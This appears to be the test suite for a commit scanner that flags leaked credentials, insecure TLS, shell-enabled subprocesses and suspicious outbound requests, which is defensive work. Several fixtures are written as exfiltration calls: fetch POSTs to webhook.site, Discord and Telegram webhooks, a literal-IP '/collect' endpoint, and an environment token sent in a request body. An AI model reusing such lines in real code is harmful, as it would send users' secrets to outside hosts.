'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { isAllowedHost, isIgnoredPath, loadConfig } = require('../lib/config');
const { parseAddedLines } = require('../lib/git');
const { toJson, toSarif } = require('../lib/report');
const { demoChanges, scanChanges } = require('../lib/scanner');

function scan(items, names = [], config = {}) {
  return scanChanges({ items, names }, config);
}

test('detects provider-shaped credentials without returning their values', () => {
  const synthetic = ['AKIA', 'ABCDEFGHIJKLMNOP'].join('');
  const result = scan([{ file: 'src/app.js', line: 7, text: `const accessKey = "${synthetic}";` }]);
  assert.ok(result.findings.some((finding) => finding.id === 'AWS-001'));
  assert.equal(JSON.stringify(toJson(result, 'test', 1)).includes(synthetic), false);
  assert.equal(JSON.stringify(toSarif(result)).includes(synthetic), false);
});

test('detects generic literals and ignores placeholders or environment references', () => {
  const result = scan([
    { file: 'src/config.js', line: 1, text: 'const password = "demo-password-value";' }, // honeypot-guard:ignore
    { file: 'src/config.js', line: 2, text: 'const apiKey = process.env.API_KEY;' },
    { file: 'src/config.js', line: 3, text: 'const token = "YOUR_TOKEN_HERE";' },
  ]);
  assert.deepEqual(result.findings.map((finding) => finding.id), ['GEN-001']);
});

test('detects sensitive assignments in staged dotenv files and sensitive filenames', () => {
  const result = scan(
    [{ file: '.env.local', line: 1, text: 'PAYMENT_API_KEY=synthetic-demo-value-123' }], // honeypot-guard:ignore
    ['.env.local', 'certs/service.pem', '.env.example'],
  );
  const ids = result.findings.map((finding) => `${finding.id}:${finding.file}`);
  assert.ok(ids.includes('FIL-001:.env.local'));
  assert.ok(ids.includes('FIL-001:certs/service.pem'));
  assert.ok(!ids.includes('FIL-001:.env.example'));
  assert.ok(result.findings.some((finding) => finding.file === '.env.local' && finding.id === 'ENV-001'));
});

test('suspicious endpoints are reported by hostname only and only on outbound request lines', () => {
  const suspicious = 'https://webhook.site/private-path?auth=do-not-print';
  const result = scan([
    { file: 'src/client.js', line: 5, text: `fetch("${suspicious}", { method: "POST" });` },
    { file: 'docs/example.md', line: 6, text: `Read about ${suspicious}` },
  ]);
  const finding = result.findings.find((item) => item.id === 'NET-001');
  assert.ok(finding);
  assert.match(finding.evidence, /webhook\.site/);
  assert.equal(finding.evidence.includes('private-path'), false);
  assert.equal(finding.evidence.includes('do-not-print'), false);
  assert.equal(result.findings.filter((item) => item.id === 'NET-001').length, 1);
});

test('outbound allowlist supports exact and subdomain wildcard entries', () => {
  assert.equal(isAllowedHost('api.example.com', ['api.example.com']), true);
  assert.equal(isAllowedHost('v1.internal.example', ['*.internal.example']), true);
  assert.equal(isAllowedHost('internal.example', ['*.internal.example']), false);
  assert.equal(isAllowedHost('elsewhere.example', ['*.internal.example']), false);
  const result = scan(
    [{ file: 'src/net.js', line: 1, text: 'fetch("https://unknown.example.test/api", { method: "POST" });' }],
    [],
    { allowedHosts: ['api.example.test'] },
  );
  assert.ok(result.findings.some((finding) => finding.id === 'NET-003'));
});

test('links sensitive environment-derived identifiers to outbound sinks heuristically', () => {
  const result = scan([
    { file: 'src/net.js', line: 4, text: 'const sessionToken = process.env.SERVICE_API_TOKEN;' }, // honeypot-guard:ignore
    { file: 'src/net.js', line: 8, text: 'fetch("https://api.example.test", { method: "POST", body: JSON.stringify({ sessionToken }) });' }, // honeypot-guard:ignore
  ]);
  const finding = result.findings.find((item) => item.id === 'FLOW-001');
  assert.ok(finding);
  assert.equal(finding.line, 8);
  assert.match(finding.evidence, /heuristic/);
});

test('detects insecure TLS and shell-enabled subprocess patterns', () => {
  const result = scan([
    { file: 'src/net.js', line: 2, text: 'requests.post("https://api.example.test", verify=False)' }, // honeypot-guard:ignore
    { file: 'src/run.js', line: 9, text: 'spawn("tool", args, { shell: true });' }, // honeypot-guard:ignore
  ]);
  assert.ok(result.findings.some((finding) => finding.id === 'TLS-001'));
  assert.ok(result.findings.some((finding) => finding.id === 'PROC-001'));
});

test('respects ignored paths, disabled rules, and inline suppressions', () => {
  const result = scan([
    { file: 'fixtures/bad.js', line: 1, text: 'const password = "synthetic-password-123";' }, // honeypot-guard:ignore
    { file: 'src/bad.js', line: 2, text: 'const password = "synthetic-password-123"; // honeypot-guard:ignore' },
    { file: 'src/key.js', line: 3, text: `const key = "${['AKIA', 'ABCDEFGHIJKLMNOP'].join('')}";` },
  ], [], { ignoredPaths: ['fixtures/**'], disabledRules: ['AWS-001'] });
  assert.equal(result.findings.length, 0);
  assert.equal(isIgnoredPath('fixtures/a/b.js', ['fixtures/**']), true);
  assert.equal(isIgnoredPath('src/fixtures.js', ['fixtures/**']), false);
});

test('diff parser uses added-line locations and skips headers/deletions', () => {
  const patch = [
    'diff --git a/src/a.js b/src/a.js',
    '--- a/src/a.js',
    '+++ b/src/a.js',
    '@@ -2,2 +2,3 @@',
    ' old line',
    '-removed line',
    '+added one',
    '+added two',
  ].join('\n');
  assert.deepEqual(parseAddedLines(patch, 'src/a.js'), [
    { file: 'src/a.js', line: 3, text: 'added one' },
    { file: 'src/a.js', line: 4, text: 'added two' },
  ]);
});

test('policy config rejects malformed and unknown fields', () => {
  const fs = require('node:fs');
  const os = require('node:os');
  const path = require('node:path');
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'hp-config-'));
  try {
    fs.writeFileSync(path.join(directory, '.honeypot-guard.json'), JSON.stringify({ unknown: [] }));
    assert.throws(() => loadConfig(directory), /Unknown configuration field/);
    fs.writeFileSync(path.join(directory, '.honeypot-guard.json'), '{invalid');
    assert.throws(() => loadConfig(directory), /Cannot parse/);
    fs.writeFileSync(path.join(directory, '.honeypot-guard.json'), JSON.stringify({ allowedHosts: 'example.com' }));
    assert.throws(() => loadConfig(directory), /array of non-empty strings/);
  } finally {
    fs.rmSync(directory, { recursive: true, force: true });
  }
});

test('synthetic demo is deterministic in findings and contains no real credential values', () => {
  const first = scanChanges(demoChanges());
  const second = scanChanges(demoChanges());
  assert.deepEqual(first.findings.map((item) => item.id), second.findings.map((item) => item.id));
  assert.ok(first.findings.length >= 7);
  assert.equal(JSON.stringify(first).includes('ABCDEFGHIJKLMNOP'), false);
});

test('recognizes webhook-style Discord/Telegram endpoints and raw paste hosts conservatively', () => {
  const result = scan([
    { file: 'src/discord.js', line: 1, text: 'fetch("https://discord.com/api/webhooks/123/token", { method: "POST" });' }, // honeypot-guard:ignore
    { file: 'src/telegram.js', line: 2, text: 'fetch("https://api.telegram.org/bot123/sendMessage", { method: "POST" });' }, // honeypot-guard:ignore
    { file: 'src/paste.js', line: 3, text: 'fetch("https://pastebin.com/raw/abc123", { method: "GET" });' }, // honeypot-guard:ignore
    { file: 'src/ordinary.js', line: 4, text: 'fetch("https://pastebin.com/archive", { method: "GET" });' },
  ]);
  assert.equal(result.findings.filter((finding) => finding.id === 'NET-001').length, 3);
});

test('detects literal IP and plaintext HTTP only in outbound calls', () => {
  const result = scan([
    { file: 'src/net.js', line: 1, text: 'fetch("http://203.0.113.8:8080/collect", { method: "POST" });' }, // honeypot-guard:ignore
    { file: 'README.md', line: 2, text: 'Example URL: http://203.0.113.8:8080/collect' },
  ]);
  assert.ok(result.findings.some((finding) => finding.id === 'NET-002'));
  assert.ok(result.findings.some((finding) => finding.id === 'TLS-002'));
  assert.equal(result.findings.filter((finding) => finding.id === 'NET-002').length, 1);
  assert.equal(result.findings.filter((finding) => finding.id === 'TLS-002').length, 1);
});

test('detects credential-shaped variable names embedded in uppercase identifiers', () => {
  const result = scan([
    { file: 'src/config.js', line: 1, text: 'const AWS_SECRET_ACCESS_KEY = "synthetic-secret-value-123";' }, // honeypot-guard:ignore
    { file: 'src/config.js', line: 2, text: 'const SERVICE_API_TOKEN = "synthetic-token-value-123";' }, // honeypot-guard:ignore
  ]);
  assert.equal(result.findings.filter((finding) => finding.id === 'GEN-001').length, 2);
});
